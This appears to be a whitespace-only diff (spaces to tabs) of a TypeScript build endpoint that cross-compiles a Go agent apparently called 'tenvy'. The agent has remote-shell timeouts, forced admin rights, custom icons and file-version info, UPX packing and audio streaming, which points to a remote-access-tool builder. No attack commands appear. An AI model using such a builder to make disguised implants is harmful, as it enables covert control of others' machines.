@@ -25,9 +25,9 @@ function encodeBase64(value: string): string {
 type NormalizedFileIcon = { filename: string; buffer: Buffer } | null;
 
 type CgoToolchain = {
-        cc: string;
-        cxx?: string;
-        env?: Record<string, string>;
+	cc: string;
+	cxx?: string;
+	env?: Record<string, string>;
 };
 
 function sanitizeIconFilename(name: string | null | undefined): string {
@@ -166,22 +166,22 @@ async function compressBinaryWithUpx(
 }
 
 function generateSharedSecret(): string {
-        return randomBytes(32).toString('hex');
+	return randomBytes(32).toString('hex');
 }
 
 function resolveCgoToolchain(targetOS: string, targetArch: string): CgoToolchain | null {
-        const key = `${targetOS}/${targetArch}`;
-        const toolchains: Record<string, CgoToolchain> = {
-                'windows/amd64': { cc: 'x86_64-w64-mingw32-gcc', cxx: 'x86_64-w64-mingw32-g++' },
-                'windows/386': { cc: 'i686-w64-mingw32-gcc', cxx: 'i686-w64-mingw32-g++' },
-                'windows/arm64': { cc: 'aarch64-w64-mingw32-gcc', cxx: 'aarch64-w64-mingw32-g++' },
-                'linux/amd64': { cc: 'gcc', cxx: 'g++' },
-                'linux/arm64': { cc: 'aarch64-linux-gnu-gcc', cxx: 'aarch64-linux-gnu-g++' },
-                'darwin/amd64': { cc: 'o64-clang', cxx: 'o64-clang++' },
-                'darwin/arm64': { cc: 'oa64-clang', cxx: 'oa64-clang++' }
-        };
+	const key = `${targetOS}/${targetArch}`;
+	const toolchains: Record<string, CgoToolchain> = {
+		'windows/amd64': { cc: 'x86_64-w64-mingw32-gcc', cxx: 'x86_64-w64-mingw32-g++' },
+		'windows/386': { cc: 'i686-w64-mingw32-gcc', cxx: 'i686-w64-mingw32-g++' },
+		'windows/arm64': { cc: 'aarch64-w64-mingw32-gcc', cxx: 'aarch64-w64-mingw32-g++' },
+		'linux/amd64': { cc: 'gcc', cxx: 'g++' },
+		'linux/arm64': { cc: 'aarch64-linux-gnu-gcc', cxx: 'aarch64-linux-gnu-g++' },
+		'darwin/amd64': { cc: 'o64-clang', cxx: 'o64-clang++' },
+		'darwin/arm64': { cc: 'oa64-clang', cxx: 'oa64-clang++' }
+	};
 
-        return toolchains[key] ?? null;
+	return toolchains[key] ?? null;
 }
 
 export const POST: RequestHandler = async ({ request }) => {
@@ -208,12 +208,12 @@ export const POST: RequestHandler = async ({ request }) => {
 		forceAdmin,
 		pollIntervalMs,
 		maxBackoffMs,
-                shellTimeoutSeconds,
-                fileIcon,
-                fileInformation,
-                audio
-        } = normalized;
-        const sharedSecret = generateSharedSecret();
+		shellTimeoutSeconds,
+		fileIcon,
+		fileInformation,
+		audio
+	} = normalized;
+	const sharedSecret = generateSharedSecret();
 	const iconPayload = normalizeFileIcon(fileIcon ?? null);
 	const fileInformationPayload = sanitizeFileInformationPayload(fileInformation ?? null);
 	const shouldEmbedResources =
@@ -295,55 +295,55 @@ export const POST: RequestHandler = async ({ request }) => {
 
 		const ldflags = ldflagsParts.join(' ');
 
-                const buildTags: string[] = [];
-                const audioStreamingRequested = audio.streaming === 'enabled';
-                const audioStubRequested = audio.streaming === 'disabled';
+		const buildTags: string[] = [];
+		const audioStreamingRequested = audio.streaming === 'enabled';
+		const audioStubRequested = audio.streaming === 'disabled';
 
-                if (audioStubRequested) {
-                        buildTags.push('tenvy_no_audio');
-                        warnings.push('Audio streaming support disabled by operator request.');
-                }
+		if (audioStubRequested) {
+			buildTags.push('tenvy_no_audio');
+			warnings.push('Audio streaming support disabled by operator request.');
+		}
 
-                const goArgs: string[] = ['build', '-ldflags', ldflags];
-                if (buildTags.length > 0) {
-                        goArgs.push('-tags', buildTags.join(','));
-                }
-                goArgs.push('-o', tempBinaryPath, './cmd');
+		const goArgs: string[] = ['build', '-ldflags', ldflags];
+		if (buildTags.length > 0) {
+			goArgs.push('-tags', buildTags.join(','));
+		}
+		goArgs.push('-o', tempBinaryPath, './cmd');
 
-                const goEnv: NodeJS.ProcessEnv = {
-                        ...process.env,
-                        GOOS: targetOS,
-                        GOARCH: targetArch,
-                        CGO_ENABLED: '0'
-                } satisfies NodeJS.ProcessEnv;
+		const goEnv: NodeJS.ProcessEnv = {
+			...process.env,
+			GOOS: targetOS,
+			GOARCH: targetArch,
+			CGO_ENABLED: '0'
+		} satisfies NodeJS.ProcessEnv;
 
-                if (audioStreamingRequested) {
-                        const toolchain = resolveCgoToolchain(targetOS, targetArch);
-                        if (!toolchain) {
-                                const logLines = buildOutput
-                                        .join('')
-                                        .split(/\r?\n/)
-                                        .filter((line) => line.trim().length > 0);
-                                const response: BuildResponse = {
-                                        success: false,
-                                        message: `Audio streaming requires a CGO toolchain for ${targetOS}/${targetArch}, but no compiler mapping is available.`,
-                                        log: logLines,
-                                        warnings
-                                };
-                                return json(response, { status: 200 });
-                        }
+		if (audioStreamingRequested) {
+			const toolchain = resolveCgoToolchain(targetOS, targetArch);
+			if (!toolchain) {
+				const logLines = buildOutput
+					.join('')
+					.split(/\r?\n/)
+					.filter((line) => line.trim().length > 0);
+				const response: BuildResponse = {
+					success: false,
+					message: `Audio streaming requires a CGO toolchain for ${targetOS}/${targetArch}, but no compiler mapping is available.`,
+					log: logLines,
+					warnings
+				};
+				return json(response, { status: 200 });
+			}
 
-                        goEnv.CGO_ENABLED = '1';
-                        goEnv.CC = toolchain.cc;
-                        if (toolchain.cxx) {
-                                goEnv.CXX = toolchain.cxx;
-                        }
-                        if (toolchain.env) {
-                                for (const [key, value] of Object.entries(toolchain.env)) {
-                                        goEnv[key] = value;
-                                }
-                        }
-                }
+			goEnv.CGO_ENABLED = '1';
+			goEnv.CC = toolchain.cc;
+			if (toolchain.cxx) {
+				goEnv.CXX = toolchain.cxx;
+			}
+			if (toolchain.env) {
+				for (const [key, value] of Object.entries(toolchain.env)) {
+					goEnv[key] = value;
+				}
+			}
+		}
 
 		const exitCode = await runCommand(
 			'go',
